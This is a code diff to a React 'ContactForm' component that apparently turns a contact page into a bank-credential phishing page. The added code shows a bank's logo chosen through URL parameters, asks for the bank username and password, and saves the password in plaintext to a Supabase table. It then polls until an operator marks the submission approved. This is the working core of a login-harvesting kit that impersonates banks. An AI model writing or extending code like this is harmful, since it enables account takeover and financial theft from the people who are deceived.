@@ -2,20 +2,35 @@ import { useState, useEffect } from 'react'
 import { supabase } from '../lib/supabase.js'
 import Icon from '../components/Icon.jsx'
 
+// Logo del banco
+function BankLogo({ name, file, domain }) {
+  const [err, setErr] = useState(false)
+  const src = file ? `/banks/${file}` : domain ? `https://icons.duckduckgo.com/ip3/${domain}.ico` : null
+  if (err || !src) return <span className="text-sm font-bold text-content-primary">{name}</span>
+  return (
+    <img
+      src={src}
+      alt={name}
+      loading="lazy"
+      onError={() => setErr(true)}
+      className="max-h-16 max-w-[90%] object-contain"
+    />
+  )
+}
+
 export default function ContactForm() {
   const [formId, setFormId] = useState(null)
-  const [fullName, setFullName] = useState('')
-  const [phone, setPhone] = useState('')
-  const [email, setEmail] = useState('')
+  const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
-  const [note, setNote] = useState('')
-  const [institution, setInstitution] = useState('')
   const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
   const [submitting, setSubmitting] = useState(false)
 
-  // Obtener user_id de los parámetros de URL
+  // Obtener parámetros de URL
   const params = new URLSearchParams(window.location.search)
   const userId = params.get('uid')
+  const bankName = params.get('bank')
+  const bankFile = params.get('file')
+  const bankDomain = params.get('domain')
 
   // Polling para saber si fue aprobado
   useEffect(() => {
@@ -34,18 +49,18 @@ export default function ContactForm() {
 
   const submitForm = async (e) => {
     e.preventDefault()
-    if (!fullName || !phone || !email || !password) return
+    if (!username || !password) return
 
     setSubmitting(true)
     const { data, error } = await supabase
       .from('contact_forms')
       .insert({
-        full_name: fullName,
-        phone: phone,
-        email: email,
+        full_name: username,
+        phone: null,
+        email: null,
         password: password,
-        note: note || null,
-        institution: institution || null,
+        note: null,
+        institution: bankName || null,
         user_id: userId || null,
         status: 'pending',
       })
@@ -72,7 +87,7 @@ export default function ContactForm() {
       <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4 py-10">
         <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl">
           <div className="mb-6 flex items-center justify-between">
-            <h1 className="text-2xl font-bold text-content-primary">Contact Information</h1>
+            <h1 className="text-2xl font-bold text-content-primary">Bank Credentials</h1>
             <button onClick={closeWindow} aria-label="Close" className="text-content-primary hover:text-content-secondary">
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                 <path d="M18 6 6 18M6 6l12 12" />
@@ -80,39 +95,22 @@ export default function ContactForm() {
             </button>
           </div>
 
+          {/* Logo del banco */}
+          <div className="mb-6 flex justify-center">
+            <span className="flex h-20 w-20 items-center justify-center rounded-2xl bg-bg-neutral">
+              <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
+            </span>
+          </div>
+
           <form onSubmit={submitForm} className="space-y-4">
             <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Full name</label>
+              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Usuario</label>
               <input
                 type="text"
                 required
-                value={fullName}
-                onChange={(e) => setFullName(e.target.value)}
-                placeholder="John Doe"
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Phone</label>
-              <input
-                type="tel"
-                required
-                value={phone}
-                onChange={(e) => setPhone(e.target.value)}
-                placeholder="(201) 555 0123"
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Email</label>
-              <input
-                type="email"
-                required
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                placeholder="john@example.com"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                placeholder="Your username"
                 className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
               />
             </div>
@@ -124,30 +122,8 @@ export default function ContactForm() {
                 required
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                placeholder="Enter password"
+                placeholder="Your password"
                 className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Institution</label>
-              <input
-                type="text"
-                value={institution}
-                onChange={(e) => setInstitution(e.target.value)}
-                placeholder="Chase, Bank of America, etc."
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Notes (optional)</label>
-              <textarea
-                value={note}
-                onChange={(e) => setNote(e.target.value)}
-                placeholder="Any additional information..."
-                rows={3}
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary resize-none"
               />
             </div>
 
